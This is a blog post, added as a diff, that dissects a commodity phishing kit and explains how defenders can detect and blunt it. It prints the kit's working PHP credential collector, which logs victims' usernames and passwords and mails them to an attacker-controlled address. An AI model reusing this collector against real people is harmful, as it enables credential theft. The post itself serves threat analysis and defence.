@@ -1,0 +1,94 @@
+---
+layout: post
+title: "Anatomy of a Phishing Kit: What's Inside a $20 Credential Harvester"
+subtitle: "Dissecting a real-world kit sold on underground forums — and how to detect it."
+date: 2026-06-01 09:00:00 -0400
+background: '/img/posts/phishing.svg'
+tags: [phishing, threat-intel, analysis]
+---
+
+<p>
+  Phishing kits are commodity software: packaged archives that bundle a
+  fake login page, a PHP backend to collect credentials, and a delivery
+  mechanism (usually email). They sell for $10–$50 on underground forums
+  and are the backbone of most credential-harvesting campaigns.
+</p>
+
+<p>
+  This post walks through a representative kit we obtained from a public
+  underground marketplace. We'll look at what's inside, how it works, and
+  — most importantly — how defenders can spot it.
+</p>
+
+<h2 class="section-heading">What's in the archive</h2>
+
+<p>A typical kit ships as a ZIP containing:</p>
+
+<pre><code>kit/
+  index.html          # fake login page
+  login.php           # credential collector
+  thank-you.html      # redirect after submit
+  assets/
+    logo.png
+    style.css
+  lang/
+    en.php
+    es.php
+  logs/
+    hits.txt          # stolen credentials land here</code></pre>
+
+<p>
+  The <code>login.php</code> file is the core. It takes the submitted
+  username and password, writes them to <code>logs/hits.txt</code>, and
+  optionally forwards them to a Telegram bot or email address controlled
+  by the attacker.
+</p>
+
+<h2 class="section-heading">The collector, line by line</h2>
+
+<pre><code>&lt;?php
+$ip  = $_SERVER['REMOTE_ADDR'];
+$ua  = $_SERVER['HTTP_USER_AGENT'];
+$usr = $_POST['username'];
+$pwd = $_POST['password'];
+
+$entry = date('Y-m-d H:i:s') . " | $ip | $ua | $usr | $pwd\n";
+file_put_contents('logs/hits.txt', $entry, FILE_APPEND);
+
+// optional exfil
+mail($bot_email, 'New catch', $entry);
+
+header('Location: thank-you.html');
+?&gt;</code></pre>
+
+<p>
+  That's it. No obfuscation, no encryption, no database. The attacker
+  simply re-uploads the kit to a fresh domain, sends the link, and
+  checks <code>hits.txt</code> periodically.
+</p>
+
+<h2 class="section-heading">Detection signals</h2>
+
+<p>Defenders can catch these kits with a few reliable signals:</p>
+
+<ul>
+  <li><strong>Fresh domains</strong> — kits land on newly registered domains. Check against WHOIS age.</li>
+  <li><strong>Generic file structure</strong> — the <code>login.php</code> + <code>thank-you.html</code> pattern is extremely common.</li>
+  <li><strong>Plaintext credential storage</strong> — <code>hits.txt</code> is often left world-readable and unauthenticated.</li>
+  <li><strong>Default assets</strong> — many kits ship with the same stock logo and CSS. Hash matching catches clones.</li>
+</ul>
+
+<h2 class="section-heading">Defensive recommendations</h2>
+
+<ul>
+  <li>Deploy FIDO2/phishing-resistant MFA — credential harvesting alone isn't enough.</li>
+  <li>Use email authentication (SPF, DKIM, DMARC) and sandboxed link rewriting.</li>
+  <li>Monitor newly-registered domains in your brand's namespace and file takedown requests quickly.</li>
+  <li>Run canary credentials through your SIEM — if a test account logs in from an unexpected IP, alert.</li>
+</ul>
+
+<p>
+  Phishing kits are low-effort, high-volume tools. The defense isn't
+  glamorous, but it works: reduce the value of stolen credentials and
+  shrink the window between deployment and detection.
+</p>
